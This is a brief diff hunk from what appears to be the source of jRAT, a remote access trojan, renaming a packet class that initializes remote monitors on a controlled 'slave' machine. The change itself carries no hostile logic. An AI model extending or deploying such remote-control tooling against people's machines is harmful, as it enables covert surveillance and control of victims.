@@ -7,7 +7,7 @@ import se.jrat.client.Slave;
 import com.redpois0n.graphs.monitors.RemoteMonitor;
 
 
-public class Packet61InitMonitors extends AbstractIncomingPacket {
+public class Packet18InitMonitors extends AbstractIncomingPacket {
 
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
